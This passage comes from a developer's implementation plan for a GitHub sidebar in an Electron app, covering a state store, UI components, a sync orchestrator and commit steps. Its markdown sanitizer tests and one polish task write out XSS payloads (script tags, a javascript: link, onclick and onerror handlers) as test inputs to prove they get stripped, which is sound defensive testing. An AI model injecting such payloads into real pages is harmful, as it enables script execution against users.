  oauthStart: (mode: 'public' | 'private') => Promise<{ flowId: string; userCode: string; verificationUri: string; expiresIn: number; interval: number }>
  oauthPoll: (flowId: string) => Promise<{ ok: boolean; profileId?: string; error?: string }>
  oauthCancel: (flowId: string) => Promise<{ ok: boolean }>
  ghcliDetect: () => Promise<{ ok: boolean; users: string[] }>
  repoDetect: (cwd: string) => Promise<{ ok: boolean; slug: string | null }>
  updateSessionConfig: (sessionId: string, patch: Partial<import('../../shared/github-types').SessionGitHubIntegration>) => Promise<{ ok: boolean }>
  syncNow: (sessionId: string) => Promise<{ ok: boolean }>
  syncPause: () => Promise<{ ok: boolean }>
  syncResume: () => Promise<{ ok: boolean }>
  getData: (slug: string) => Promise<{ ok: boolean; data: import('../../shared/github-types').RepoCache | null }>
  getSessionContext: (sessionId: string) => Promise<{ ok: boolean; data: any }>
  onDataUpdate: (cb: (payload: { slug: string; data: import('../../shared/github-types').RepoCache }) => void) => () => void
  rerunActionsRun: (slug: string, runId: number) => Promise<{ ok: boolean }>
  mergePR: (slug: string, prNumber: number, method: 'merge' | 'squash' | 'rebase') => Promise<{ ok: boolean }>
  readyPR: (slug: string, prNumber: number) => Promise<{ ok: boolean }>
  replyToReview: (slug: string, threadId: string, body: string) => Promise<{ ok: boolean }>
  markNotifRead: (profileId: string, notifId: string) => Promise<{ ok: boolean }>
}
```

- [ ] **Step 3: Typecheck + build**

```bash
npm run typecheck
npm run build
```

- [ ] **Step 4: Commit**

```bash
git add src/preload/index.ts src/renderer/types/electron.d.ts
git commit -m "feat(github): preload bridge + renderer type declarations"
```

---

## Phase I — Renderer Store & Markdown Sanitizer

### Task I1: Zustand store

**Files:** Create `src/renderer/stores/githubStore.ts`.

- [ ] **Step 1: Create the store**

```ts
// src/renderer/stores/githubStore.ts
import { create } from 'zustand'
import type { GitHubConfig, AuthProfile, SessionGitHubIntegration, RepoCache } from '../../shared/github-types'

interface GitHubStoreState {
  config: GitHubConfig | null
  profiles: AuthProfile[]
  repoData: Record<string, RepoCache>
  panelVisible: boolean
  // Per-session panel state
  sessionStates: Record<string, {
    panelWidth: number
    collapsedSections: Record<string, boolean>
  }>

  loadConfig: () => Promise<void>
  updateConfig: (patch: Partial<GitHubConfig>) => Promise<void>
  removeProfile: (id: string) => Promise<void>
  renameProfile: (id: string, label: string) => Promise<void>
  togglePanel: () => void
  setSectionCollapsed: (sessionId: string, sectionId: string, collapsed: boolean) => void
  setPanelWidth: (sessionId: string, w: number) => void
  handleDataUpdate: (payload: { slug: string; data: RepoCache }) => void
}

export const useGitHubStore = create<GitHubStoreState>((set, get) => ({
  config: null,
  profiles: [],
  repoData: {},
  panelVisible: true,
  sessionStates: {},

  loadConfig: async () => {
    const config = await window.electron.github.getConfig()
    set({
      config,
      profiles: config ? Object.values(config.authProfiles) : [],
    })
  },

  updateConfig: async (patch) => {
    const updated = await window.electron.github.updateConfig(patch)
    set({
      config: updated,
      profiles: Object.values(updated.authProfiles),
    })
  },

  removeProfile: async (id) => {
    await window.electron.github.removeProfile(id)
    await get().loadConfig()
  },

  renameProfile: async (id, label) => {
    await window.electron.github.renameProfile(id, label)
    await get().loadConfig()
  },

  togglePanel: () => set((s) => ({ panelVisible: !s.panelVisible })),

  setSectionCollapsed: (sessionId, sectionId, collapsed) =>
    set((s) => {
      const cur = s.sessionStates[sessionId] ?? { panelWidth: 340, collapsedSections: {} }
      return {
        sessionStates: {
          ...s.sessionStates,
          [sessionId]: {
            ...cur,
            collapsedSections: { ...cur.collapsedSections, [sectionId]: collapsed },
          },
        },
      }
    }),

  setPanelWidth: (sessionId, w) =>
    set((s) => {
      const cur = s.sessionStates[sessionId] ?? { panelWidth: 340, collapsedSections: {} }
      return {
        sessionStates: {
          ...s.sessionStates,
          [sessionId]: { ...cur, panelWidth: w },
        },
      }
    }),

  handleDataUpdate: ({ slug, data }) =>
    set((s) => ({ repoData: { ...s.repoData, [slug]: data } })),
}))

// Listener setup — invoked once from App.tsx postConfigInit
let unsubscribe: (() => void) | null = null
export function setupGitHubListener() {
  if (unsubscribe) return
  unsubscribe = window.electron.github.onDataUpdate((payload) => {
    useGitHubStore.getState().handleDataUpdate(payload)
  })
}
```

- [ ] **Step 2: Typecheck**

Run: `npm run typecheck`

- [ ] **Step 3: Commit**

```bash
git add src/renderer/stores/githubStore.ts
git commit -m "feat(github): Zustand store for config, profiles, repo data, panel state"
```

---

### Task I2: Markdown sanitizer

**Files:** Create `src/renderer/utils/markdownSanitizer.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/markdown-sanitizer.test.ts
import { describe, it, expect } from 'vitest'
import { renderCommentMarkdown } from '../../../src/renderer/utils/markdownSanitizer'

describe('renderCommentMarkdown', () => {
  it('renders basic markdown', () => {
    const html = renderCommentMarkdown('**bold** and `code`')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<code>code</code>')
  })
  it('strips <script> tags', () => {
    const html = renderCommentMarkdown('<script>alert(1)</script>text')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(1)')
  })
  it('strips javascript: hrefs', () => {
    const html = renderCommentMarkdown('[click](javascript:alert(1))')
    expect(html).not.toMatch(/javascript:/i)
  })
  it('keeps https: links', () => {
    const html = renderCommentMarkdown('[x](https://example.com)')
    expect(html).toContain('href="https://example.com"')
  })
  it('strips inline event handlers', () => {
    const html = renderCommentMarkdown('<a onclick="bad()">x</a>')
    expect(html).not.toContain('onclick')
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/markdown-sanitizer.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/renderer/utils/markdownSanitizer.ts
import { marked } from 'marked'
import DOMPurify from 'isomorphic-dompurify'

marked.setOptions({ breaks: true, gfm: true })

const ALLOWED_TAGS = [
  'a', 'p', 'br', 'em', 'strong', 'code', 'pre',
  'ul', 'ol', 'li', 'blockquote', 'hr',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'del', 's',
]

const ALLOWED_ATTR = ['href', 'title', 'src', 'alt']

export function renderCommentMarkdown(md: string): string {
  const raw = marked.parse(md ?? '', { async: false }) as string
  return DOMPurify.sanitize(raw, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#)/i,
  })
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/markdown-sanitizer.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/renderer/utils/markdownSanitizer.ts tests/unit/github/markdown-sanitizer.test.ts
git commit -m "feat(github): markdown sanitizer (marked + DOMPurify allowlist)"
```

---

## Phase J — Config Page

### Task J1: Config page tab skeleton + route

**Files:** Create `src/renderer/components/github/config/GitHubConfigTab.tsx`, integrate into existing Config page.

- [ ] **Step 1: Find existing config page structure**

Run: `grep -r "ConfigPage\|settingsPage\|SettingsPage" F:/CLAUDE_MULTI_APP/src/renderer/components --include="*.tsx" -l | head -5`

Open the identified main settings file. Note the tab structure — we'll add a GitHub tab following the existing pattern.

- [ ] **Step 2: Create GitHubConfigTab component**

```tsx
// src/renderer/components/github/config/GitHubConfigTab.tsx
import React, { useEffect } from 'react'
import { useGitHubStore } from '../../../stores/githubStore'
import AuthProfilesList from './AuthProfilesList'
import FeatureTogglesList from './FeatureTogglesList'
import PermissionsSummary from './PermissionsSummary'
import PrivacySettings from './PrivacySettings'
import SyncSettings from './SyncSettings'

export default function GitHubConfigTab() {
  const config = useGitHubStore((s) => s.config)
  const loadConfig = useGitHubStore((s) => s.loadConfig)
  const updateConfig = useGitHubStore((s) => s.updateConfig)

  useEffect(() => { loadConfig() }, [loadConfig])

  if (!config) return <div className="p-6 text-overlay1">Loading GitHub config…</div>

  return (
    <div className="p-6 space-y-6 max-w-3xl">
      <div className="flex items-center justify-between">
        <h2 className="text-lg text-text">GitHub integration</h2>
        <label className="flex items-center gap-2 text-sm">
          <input
            type="checkbox"
            checked={config.enabledByDefault}
            onChange={(e) => updateConfig({ enabledByDefault: e.target.checked })}
          />
          <span>Enable by default for new sessions</span>
        </label>
      </div>

      <AuthProfilesList />
      <FeatureTogglesList />
      <PermissionsSummary />
      <PrivacySettings />
      <SyncSettings />

      <div className="text-xs text-overlay0 pt-4 border-t border-surface0">
        <strong>No telemetry.</strong> This feature does not send any usage data to Anthropic or third parties.
        All requests go to github.com using your configured auth.
      </div>
    </div>
  )
}
```

- [ ] **Step 3: Register the tab** in the existing config page's tab list.

Depending on the existing structure, add a tab entry like `{ id: 'github', label: 'GitHub', component: GitHubConfigTab }`.

- [ ] **Step 4: Typecheck (sub-components don't exist yet, so this will fail — create stubs first)**

Create empty default-export stubs for:
- `AuthProfilesList.tsx`
- `FeatureTogglesList.tsx`
- `PermissionsSummary.tsx`
- `PrivacySettings.tsx`
- `SyncSettings.tsx`

Each: `export default function X() { return <div>TODO</div> }`

- [ ] **Step 5: Typecheck + build + commit**

```bash
npm run typecheck
npm run build
git add src/renderer/components/github/config/
git commit -m "feat(github): config page tab skeleton + stub sub-components"
```

---

### Task J2–J7: Config sub-components

Each of these follows the same pattern: component reads from `useGitHubStore`, calls IPC actions on user input, renders state. Due to length, these tasks are summarized below — the executing engineer should write each as a separate commit with tests where logic is non-trivial.

**Task J2 — AuthProfilesList.tsx:** renders a card per profile (avatar, username, kind badge, scopes, expiry if `expiryObservable`, rate-limit gauge); buttons for Rename (opens input inline), Remove (confirm modal), Test (calls `testProfile`); primary CTA **Sign in with GitHub** (opens OAuth flow via `oauthStart` + displays user_code + poll until complete); expandable **Advanced auth options** section showing detected gh CLI accounts (one-click adopt) + PAT paste forms.

**Task J3 — FeatureTogglesList.tsx:** maps over `GitHubFeatureKey`, each row has label, description, required-capabilities chip list, disabled when no profile has them; on toggle, calls `updateConfig({ featureToggles: ... })`. Tooltip on disabled: "*Add a PAT with X scope*".

**Task J4 — PermissionsSummary.tsx:** computed from enabled toggles: shows minimum scope sets needed for each auth kind (OAuth, classic PAT, fine-grained PAT); updates live as toggles change. Includes a "Copy scopes to clipboard" button.

**Task J5 — PrivacySettings.tsx:** single toggle for `transcriptScanningOptIn` with privacy explainer paragraph.

**Task J6 — SyncSettings.tsx:** three dropdowns for sync intervals (active/background/notifications); Pause/Resume button; Sync active session now button.

**Task J7 — OAuth sign-in modal:** component opens on Sign in click; displays user code with big monospace text + Copy button + "Open GitHub" button that calls `shell.openExternal`; polls every 5s via `oauthPoll` until `profileId` returned; Cancel button calls `oauthCancel`.

For each:
- TDD where logic is non-trivial (sanitization, polling lifecycle).
- Commit message prefix `feat(github):`.
- Typecheck before commit.

---

## Phase K — Per-Session Integration UI

### Task K1: SessionGitHubConfig component

**Files:** Create `src/renderer/components/session/SessionGitHubConfig.tsx`. Integrate into existing session config drawer.

- [ ] **Step 1: Inspect existing session config structure**

Run: `grep -r "sessionConfig\|SessionConfig" F:/CLAUDE_MULTI_APP/src/renderer/components --include="*.tsx" -l | head`

Open the session config drawer and note how tabs/sections are structured.

- [ ] **Step 2: Create component**

```tsx
// src/renderer/components/session/SessionGitHubConfig.tsx
import React, { useEffect, useState } from 'react'
import { useGitHubStore } from '../../stores/githubStore'
import { parseRepoUrlClient } from './parseRepoUrlClient' // small helper

interface Props { sessionId: string; cwd: string; integration?: import('../../../shared/github-types').SessionGitHubIntegration }

export default function SessionGitHubConfig({ sessionId, cwd, integration }: Props) {
  const config = useGitHubStore((s) => s.config)
  const profiles = useGitHubStore((s) => s.profiles)
  const [repoUrl, setRepoUrl] = useState(integration?.repoUrl ?? '')
  const [detected, setDetected] = useState<string | null>(null)
  const [profileId, setProfileId] = useState(integration?.authProfileId ?? '')
  const [enabled, setEnabled] = useState(integration?.enabled ?? config?.enabledByDefault ?? false)

  useEffect(() => {
    if (!integration?.repoUrl) {
      window.electron.github.repoDetect(cwd).then((r) => {
        if (r.ok && r.slug) setDetected(r.slug)
      })
    }
  }, [cwd, integration?.repoUrl])

  const save = async () => {
    await window.electron.github.updateSessionConfig(sessionId, {
      enabled,
      repoUrl,
      repoSlug: parseRepoUrlClient(repoUrl),
      authProfileId: profileId || undefined,
    })
  }

  return (
    <div className="space-y-3">
      <label className="flex items-center gap-2">
        <input type="checkbox" checked={enabled} onChange={(e) => setEnabled(e.target.checked)} />
        <span>Enable GitHub integration for this session</span>
      </label>
      {detected && !repoUrl && (
        <div className="text-sm text-subtext0">
          Detected <strong>{detected}</strong>.
          <button className="ml-2 text-blue" onClick={() => setRepoUrl(`https://github.com/${detected}`)}>Use this</button>
        </div>
      )}
      <label className="block">
        <div className="text-xs text-subtext0 mb-1">Repo URL</div>
        <input value={repoUrl} onChange={(e) => setRepoUrl(e.target.value)} className="w-full bg-surface0 p-2 rounded" />
      </label>
      <label className="block">
        <div className="text-xs text-subtext0 mb-1">Auth profile</div>
        <select value={profileId} onChange={(e) => setProfileId(e.target.value)} className="w-full bg-surface0 p-2 rounded">
          <option value="">(auto — capability routing)</option>
          {profiles.map((p) => (
            <option key={p.id} value={p.id}>{p.label} ({p.username})</option>
          ))}
        </select>
      </label>
      <button onClick={save} className="bg-blue text-base px-3 py-1 rounded">Save</button>
    </div>
  )
}
```

Also create `parseRepoUrlClient.ts` — a minimal renderer-side version of the parser so we can validate the input without an IPC round trip.

```ts
// src/renderer/components/session/parseRepoUrlClient.ts
export function parseRepoUrlClient(raw: string): string | undefined {
  const s = raw.trim()
  if (!s) return undefined
  const httpsMatch = s.match(/^https?:\/\/github\.com\/([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i)
  if (httpsMatch) return `${httpsMatch[1]}/${httpsMatch[2]}`
  const sshMatch = s.match(/^git@github\.com:([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i)
  if (sshMatch) return `${sshMatch[1]}/${sshMatch[2]}`
  return undefined
}
```

- [ ] **Step 3: Integrate into session config drawer** per existing tab pattern.

- [ ] **Step 4: Typecheck + build + commit**

```bash
npm run typecheck
npm run build
git add src/renderer/components/session/SessionGitHubConfig.tsx src/renderer/components/session/parseRepoUrlClient.ts
git commit -m "feat(github): per-session GitHub config tab with repo auto-detect"
```

---

## Phase L — Panel Shell and Sections

### Task L1: Panel shell component

**Files:** Create `src/renderer/components/github/GitHubPanel.tsx`, `SectionFrame.tsx`, `PanelHeader.tsx`. Mount in `App.tsx`.

- [ ] **Step 1: SectionFrame**

```tsx
// src/renderer/components/github/SectionFrame.tsx
import React from 'react'
import { useGitHubStore } from '../../stores/githubStore'

interface Props {
  sessionId: string
  id: string
  title: string
  summary?: React.ReactNode
  rightAction?: React.ReactNode
  emptyIndicator?: boolean
  children: React.ReactNode
}

export default function SectionFrame({
  sessionId, id, title, summary, rightAction, emptyIndicator, children,
}: Props) {
  const collapsed = useGitHubStore((s) =>
    s.sessionStates[sessionId]?.collapsedSections[id] ?? emptyIndicator ?? false,
  )
  const toggle = useGitHubStore((s) => s.setSectionCollapsed)

  return (
    <section className="border-b border-surface0">
      <button
        aria-expanded={!collapsed}
        className="w-full flex items-center gap-2 px-3 py-2 text-left hover:bg-surface0/50 focus:outline focus:outline-2 focus:outline-blue"
        onClick={() => toggle(sessionId, id, !collapsed)}
      >
        <span className="text-sm text-mauve">{collapsed ? '▶' : '▼'}</span>
        <span className="text-sm font-medium uppercase text-subtext0 tracking-wide">{title}</span>
        {summary && <span className="text-xs text-overlay1 ml-2">{summary}</span>}
        {emptyIndicator && <span className="text-xs text-overlay0 ml-auto">—</span>}
        {rightAction && <span className="ml-auto">{rightAction}</span>}
      </button>
      {!collapsed && <div className="px-3 pb-3">{children}</div>}
    </section>
  )
}
```

- [ ] **Step 2: PanelHeader**

```tsx
// src/renderer/components/github/PanelHeader.tsx
import React from 'react'

interface Props {
  branch?: string
  ahead?: number
  behind?: number
  dirty?: number
  syncState: 'syncing' | 'synced' | 'rate-limited' | 'error' | 'idle'
  syncedAtLabel?: string
  onRefresh: () => void
}

export default function PanelHeader({ branch, ahead, behind, dirty, syncState, syncedAtLabel, onRefresh }: Props) {
  return (
    <div className="flex items-center gap-2 px-3 py-2 border-b border-surface0 bg-mantle">
      {branch && <span className="text-sm bg-surface0 px-2 py-0.5 rounded">{branch}</span>}
      {typeof ahead === 'number' && <span className="text-green text-xs">↑{ahead}</span>}
      {typeof behind === 'number' && <span className="text-teal text-xs">↓{behind}</span>}
      {typeof dirty === 'number' && dirty > 0 && <span className="text-peach text-xs">●{dirty}</span>}
      <span className="ml-auto text-xs">
        {syncState === 'syncing' && <span className="text-yellow">● syncing</span>}
        {syncState === 'synced' && <span className="text-green">🟢 {syncedAtLabel}</span>}
        {syncState === 'rate-limited' && <span className="text-yellow">🟡 rate limited</span>}
        {syncState === 'error' && <span className="text-red">🔴 error</span>}
      </span>
      <button onClick={onRefresh} title="Refresh" aria-label="Refresh" className="text-overlay1 hover:text-text">⟳</button>
    </div>
  )
}
```

- [ ] **Step 3: GitHubPanel shell**

```tsx
// src/renderer/components/github/GitHubPanel.tsx
import React, { useEffect } from 'react'
import { useGitHubStore } from '../../stores/githubStore'
import PanelHeader from './PanelHeader'
import SessionContextSection from './sections/SessionContextSection'
import ActivePRSection from './sections/ActivePRSection'
import CISection from './sections/CISection'
import ReviewsSection from './sections/ReviewsSection'
import IssuesSection from './sections/IssuesSection'
import LocalGitSection from './sections/LocalGitSection'
import NotificationsSection from './sections/NotificationsSection'
import AgentIntentSection from './sections/AgentIntentSection'

interface Props { sessionId: string; slug?: string; branch?: string }

export default function GitHubPanel({ sessionId, slug, branch }: Props) {
  const visible = useGitHubStore((s) => s.panelVisible)
  const sessionState = useGitHubStore((s) => s.sessionStates[sessionId])
  const width = sessionState?.panelWidth ?? 340
  const data = useGitHubStore((s) => (slug ? s.repoData[slug] : undefined))

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      const isMac = navigator.platform.toUpperCase().includes('MAC')
      if (e.key === '/' && (isMac ? e.metaKey : e.ctrlKey)) {
        e.preventDefault()
        useGitHubStore.getState().togglePanel()
      }
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [])

  if (!visible) {
    return (
      <aside className="w-7 bg-mantle border-l border-surface0 flex flex-col items-center py-3" aria-label="GitHub panel (collapsed)">
        <button onClick={() => useGitHubStore.getState().togglePanel()} title="Show GitHub panel" className="text-subtext0">GH</button>
      </aside>
    )
  }

  return (
    <aside
      className="bg-base border-l border-surface0 flex flex-col overflow-y-auto"
      style={{ width, minWidth: 280, maxWidth: 520 }}
      aria-label="GitHub panel"
    >
      <PanelHeader
        branch={branch}
        syncState="idle"
        onRefresh={() => slug && window.electron.github.syncNow(sessionId)}
      />
      <div aria-live="polite">
        <SessionContextSection sessionId={sessionId} slug={slug} />
        <ActivePRSection sessionId={sessionId} pr={data?.pr} />
        <CISection sessionId={sessionId} runs={data?.actions} />
        <ReviewsSection sessionId={sessionId} reviews={data?.reviews} slug={slug} />
        <IssuesSection sessionId={sessionId} issues={data?.issues} />
        <LocalGitSection sessionId={sessionId} />
        <NotificationsSection sessionId={sessionId} />
        <AgentIntentSection sessionId={sessionId} />
      </div>
    </aside>
  )
}
```

- [ ] **Step 4: Stub section files** — each returns a SectionFrame with "TODO" content so the panel mounts cleanly.

- [ ] **Step 5: Mount in App.tsx** next to the existing terminal layout (after the main session view). Ensure panel width is accounted for in the flex layout.

- [ ] **Step 6: Build + verify panel appears**

```bash
npm run build
npm run dev
```

Verify: app launches; with a session selected, the right panel appears (empty TODO sections). `Ctrl+/` toggles visibility.

- [ ] **Step 7: Commit**

```bash
git add src/renderer/components/github/ src/renderer/App.tsx
git commit -m "feat(github): right panel shell with collapsible sections + Ctrl+/ toggle"
```

---

### Tasks L2–L9: Individual sections

Each follows this recipe:
1. Write component reading data from props/store.
2. Use `SectionFrame` as outer wrapper.
3. Handle loading, empty, error states.
4. Add unit test where component has non-trivial data transformation (e.g., grouping reviews by file).

Section specifics:

**Task L2 — LocalGitSection:** reads local git state via a new IPC call `github:localgit:get` (add to handlers). Returns `{ staged, unstaged, untracked, aheadCommits, stashCount }`. Section renders three expandable lists + commits-ahead list with "click → inline expand". Works without auth.

**Task L3 — SessionContextSection:** reads `window.electron.github.getSessionContext(sessionId)` returning `{ primaryIssue?, recentFiles, activePR? }`. Renders top-primary issue with avatar+title if OAuth, `#NNN` text otherwise; files list limited to 20; active PR chip.

**Task L4 — ActivePRSection:** reads `data.pr` from store. Full PR card with title, author, draft/ready badge, CI summary, review state, mergeable indicator. Merge dropdown fetches repo's allowed merge methods once per repo (cached). Actions wired to IPC.

**Task L5 — CISection:** reads `data.actions`. Groups by workflow name, shows latest run. Failed runs expand to log tail on click. Re-run button calls `rerunActionsRun`.

**Task L6 — ReviewsSection:** reads `data.reviews`. Groups threads by file. Each thread: commenter, body rendered via `renderCommentMarkdown`, Reply + View in GitHub buttons. **All rendered via `dangerouslySetInnerHTML` with sanitized output** — add ESLint disable comment only at that line.

**Task L7 — IssuesSection:** reads `data.issues`. Shows all, with `primary` badge on the one that matches Session Context's primary. Click → `shell.openExternal(url)`.

**Task L8 — NotificationsSection:** reads notifications from a notifications-capable profile. Profile selector if multiple. Mark read action.

**Task L9 — AgentIntentSection:** stub rendering "Deferred — activates with HTTP Hooks Gateway" always.

For each: TDD for non-trivial transforms, `npm run typecheck`, `npm run build`, commit with `feat(github): X section`.

---

## Phase M — Sync Orchestrator

### Task M1: Sync orchestrator wiring

**Files:** Create `src/main/github/session/sync-orchestrator.ts`. Wire into session lifecycle in `src/main/index.ts`.

- [ ] **Step 1: Create orchestrator**

```ts
// src/main/github/session/sync-orchestrator.ts
import { BrowserWindow } from 'electron'
import { GITHUB_DATA_UPDATE } from '../../../shared/ipc-channels'
import type { GitHubConfig, SessionGitHubIntegration } from '../../../shared/github-types'
import { CacheStore } from '../cache/cache-store'
import { githubFetch } from '../client/github-fetch'
import { fetchPRByBranch, fetchWorkflowRuns, fetchPRReviews } from '../client/rest-fallback'
import { EtagCache } from '../client/etag-cache'
import { RateLimitShield } from '../client/rate-limit-shield'

interface SessionSyncState {
  sessionId: string
  slug: string
  branch: string
  integration: SessionGitHubIntegration
  activeTimer?: NodeJS.Timeout
  lastSync: number
  focused: boolean
}

export class SyncOrchestrator {
  private sessions = new Map<string, SessionSyncState>()
  private paused = false
  private shields = new Map<string, RateLimitShield>()

  constructor(
    private cacheStore: CacheStore,
    private getConfig: () => Promise<GitHubConfig | null>,
    private getTokenForSession: (sessionId: string) => Promise<string | null>,
    private getWindow: () => BrowserWindow | null,
  ) {}

  registerSession(state: Omit<SessionSyncState, 'activeTimer' | 'lastSync' | 'focused'>) {
    this.sessions.set(state.sessionId, { ...state, lastSync: 0, focused: false })
    this.scheduleNext(state.sessionId)
  }

  unregisterSession(sessionId: string) {
    const s = this.sessions.get(sessionId)
    if (s?.activeTimer) clearTimeout(s.activeTimer)
    this.sessions.delete(sessionId)
  }

  setFocus(sessionId: string, focused: boolean) {
    const s = this.sessions.get(sessionId)
    if (!s) return
    s.focused = focused
    this.scheduleNext(sessionId)
  }

  pause() { this.paused = true }
  resume() {
    this.paused = false
    this.sessions.forEach((_, id) => this.scheduleNext(id))
  }

  async syncNow(sessionId: string) {
    await this.doSync(sessionId)
  }

  private async scheduleNext(sessionId: string) {
    if (this.paused) return
    const s = this.sessions.get(sessionId)
    if (!s) return
    if (s.activeTimer) clearTimeout(s.activeTimer)
    const cfg = await this.getConfig()
    const intervalSec = s.focused
      ? cfg?.syncIntervals.activeSessionSec ?? 60
      : cfg?.syncIntervals.backgroundSec ?? 300
    s.activeTimer = setTimeout(() => {
      this.doSync(sessionId).finally(() => this.scheduleNext(sessionId))
    }, intervalSec * 1000)
  }

  private async doSync(sessionId: string) {
    const s = this.sessions.get(sessionId)
    if (!s) return
    const token = await this.getTokenForSession(sessionId)
    if (!token) return

    let shield = this.shields.get(s.integration.authProfileId ?? 'default')
    if (!shield) {
      shield = new RateLimitShield()
      this.shields.set(s.integration.authProfileId ?? 'default', shield)
    }

    const cache = await this.cacheStore.load()
    const repoCache = cache.repos[s.slug] ?? { etags: {}, lastSynced: 0, accessedAt: 0 }
    const etags = new EtagCache(repoCache.etags)
    const fetchOpts = { tokenFn: async () => token, shield, etags }

    try {
      const pr = await fetchPRByBranch(s.slug, s.branch, fetchOpts)
      if (pr) {
        repoCache.pr = {
          number: pr.number,
          title: pr.title,
          state: pr.state,
          draft: pr.draft,
          author: pr.user?.login,
          authorAvatarUrl: pr.user?.avatar_url,
          createdAt: Date.parse(pr.created_at),
          updatedAt: Date.parse(pr.updated_at),
          mergeableState: pr.mergeable === null ? 'unknown' : pr.mergeable ? 'clean' : 'conflict',
          url: pr.html_url,
        }
      }
      const runs = await fetchWorkflowRuns(s.slug, s.branch, fetchOpts)
      repoCache.actions = runs.map((r) => ({
        id: r.id, workflowName: r.name,
        status: r.status, conclusion: r.conclusion, url: r.html_url,
      }))
      if (repoCache.pr) {
        const reviews = await fetchPRReviews(s.slug, repoCache.pr.number, fetchOpts)
        repoCache.reviews = reviews.map((rv) => ({
          id: rv.id, reviewer: rv.user.login, reviewerAvatarUrl: rv.user.avatar_url,
          state: rv.state, threads: [],
        }))
      }
      repoCache.lastSynced = Date.now()
      repoCache.accessedAt = Date.now()
      cache.repos[s.slug] = repoCache
      if (!cache.lru.includes(s.slug)) cache.lru.push(s.slug)
      await this.cacheStore.save(cache)

      this.getWindow()?.webContents.send(GITHUB_DATA_UPDATE, { slug: s.slug, data: repoCache })
      s.lastSync = Date.now()
    } catch (e) {
      console.warn('[github-sync] error for', s.slug, String(e))
    }
  }
}
```

- [ ] **Step 2: Wire into main/index.ts**

In `main/index.ts`, instantiate and register sessions when the sessionStore emits new sessions (follow the existing pattern for cloud agents / tokenomics).

- [ ] **Step 3: Typecheck + build**

```bash
npm run typecheck
npm run build
```

- [ ] **Step 4: Commit**

```bash
git add src/main/github/session/sync-orchestrator.ts src/main/index.ts
git commit -m "feat(github): sync orchestrator with tiered intervals + cache persistence"
```

---

## Phase N — Onboarding

### Task N1: Post-update onboarding modal

**Files:** Create `src/renderer/components/github/onboarding/OnboardingModal.tsx`, wire trigger in `App.tsx`.

- [ ] **Step 1: Create modal**

```tsx
// src/renderer/components/github/onboarding/OnboardingModal.tsx
import React from 'react'

interface Props { onClose: () => void; onSetup: () => void; appVersion: string }

export default function OnboardingModal({ onClose, onSetup, appVersion }: Props) {
  return (
    <div className="fixed inset-0 bg-base/80 flex items-center justify-center z-50" role="dialog" aria-modal="true" aria-label="GitHub integration onboarding">
      <div className="bg-mantle p-6 rounded max-w-md text-text">
        <h3 className="text-lg mb-3">New: GitHub sidebar</h3>
        <p className="text-sm text-subtext0 mb-3">
          See PR, CI, reviews, and issues for the session you're working on — right next to the terminal.
        </p>
        <ol className="text-sm text-subtext0 space-y-2 mb-4 list-decimal list-inside">
          <li>We auto-detect your repos per session — accept or edit.</li>
          <li>Sign in with GitHub (or use <code>gh</code> CLI if you have it authed) to unlock PR/CI/review data.</li>
          <li>Enable per session at your own pace — nothing runs until you opt in.</li>
        </ol>
        <div className="flex gap-2 justify-end">
          <button onClick={onClose} className="text-subtext0 px-3 py-1">Later</button>
          <button onClick={onSetup} className="bg-blue text-base px-3 py-1 rounded">Set up now</button>
        </div>
      </div>
    </div>
  )
}
```

- [ ] **Step 2: Trigger logic in App.tsx**

```tsx
// inside App.tsx postConfigInit
const config = useGitHubStore.getState().config
if (!config?.seenOnboardingVersion || config.seenOnboardingVersion !== currentAppVersion) {
  setShowOnboarding(true)
}
// On close: updateConfig({ seenOnboardingVersion: currentAppVersion })
// On setup: navigate to Config page → GitHub tab, then close modal
```

- [ ] **Step 3: Typecheck + build + commit**

```bash
npm run typecheck
npm run build
git add src/renderer/components/github/onboarding/OnboardingModal.tsx src/renderer/App.tsx
git commit -m "feat(github): onboarding modal with post-update trigger"
```

---

## Phase O — Final Polish

### Task O1: Error states + rate limit banners

In each section and in the panel shell, handle:
- Rate limited: yellow banner atop panel with reset countdown
- Auth expired: red banner with "Sign in again" CTA
- Not a git repo: hide sections, show "Set repo URL" prompt

### Task O2: Expiry warnings

Inspect each profile at app launch + on every successful fetch response. If `expiryObservable` and `expiresAt` within thresholds, show the tiered warning (yellow → orange → red). Profile card also reflects state.

### Task O3: Accessibility pass

- Ensure every button has `aria-label` or visible text
- Color + icon for all state indicators (don't rely on color alone)
- `aria-live="polite"` on panel scroll region (already set in L1)
- Keyboard: tab through sections, Enter to toggle, Escape to close modals

### Task O4: Sanitization E2E

Add test that loads a review comment with `<script>`, `javascript:`, and `<img src=x onerror=bad>` — confirm none execute or render as active HTML.

---

## Phase P — Final Verification and PR

### Task P1: Full verification

- [ ] `npm run typecheck` — clean
- [ ] `npx vitest run` — all pass
- [ ] `npm run test:e2e` — all pass (or documented reason why any skipped)
- [ ] Manual: dev run with APP_DEV config, sign in with GitHub, panel populates on real repo

### Task P2: Check uncommitted / rebase to latest beta

```bash
git fetch origin
git rebase origin/beta
# resolve any conflicts
```

### Task P3: Push branch

```bash
git push -u origin feature/github-sidebar
```

### Task P4: Open PR

```bash
gh pr create --base beta --title "feat: add GitHub sidebar" --body "$(cat <<'EOF'
## Summary

- Right-side GitHub panel with session-aware interpretation
- Three-tier auth (gh CLI / OAuth device flow / PAT) with capability routing
- Config page with feature-toggles-drive-permissions UX
- Per-session integration with auto-detected repo URLs
- ETag cache + per-bucket rate-limit shield + GraphQL→REST fallback
- Post-update onboarding modal

## Spec

- `docs/superpowers/specs/2026-04-17-github-sidebar-design.md`

## Test plan

- [ ] gh CLI delegation detects authed accounts
- [ ] OAuth device flow completes against real GitHub (APP_DEV)
